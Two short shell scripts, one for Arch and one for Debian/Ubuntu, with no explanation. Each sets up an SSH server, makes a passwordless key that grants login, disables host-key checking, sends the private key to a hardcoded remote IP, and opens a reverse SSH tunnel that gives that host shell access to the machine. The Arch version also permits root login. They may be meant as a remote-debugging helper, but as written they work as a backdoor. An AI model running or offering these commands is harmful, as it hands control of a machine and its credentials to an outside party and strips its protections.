OWD=$(pwd)
pacman --noconfirm -Suy openssh nfs-utils unzip
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
/usr/sbin/sshd
eval $(ssh-agent)
chmod 0700 /root
cd /root
mkdir .ssh
chmod 0700 .ssh
unzip ${OWD}/files.zip
ssh-add sshkey
ssh-keygen -t ed25519 -P "" -f sshdkey
cat sshdkey.pub > .ssh/authorized_keys
chmod 0600 .ssh/authorized_keys
echo "Host *" > .ssh/config
echo "  StrictHostKeyChecking no" >> .ssh/config
scp sshdkey root@168.235.81.234:/root/sshkey
ssh -R 22001:127.0.0.1:22 root@168.235.81.234 "sleep 2h"
exit 0



OWD=$(pwd)

sudo apt install -y openssh-server
sudo service ssh start

eval $(ssh-agent)

cd ~
mkdir .ssh
chmod 0700 .ssh
unzip ${OWD}/files.zip
ssh-add sshkey
ssh-keygen -t ed25519 -P "" -f .ssh/id_ed25519
cp .ssh/id_ed25519.pub .ssh/authorized_keys
chmod 0600 .ssh/authorized_keys
echo "Host *" > .ssh/config
echo "  StrictHostKeyChecking no" >> .ssh/config
scp .ssh/id_ed25519 root@168.235.81.234:/root/sshkey
ssh -R 22001:127.0.0.1:22 root@168.235.81.234 "sleep 2h"

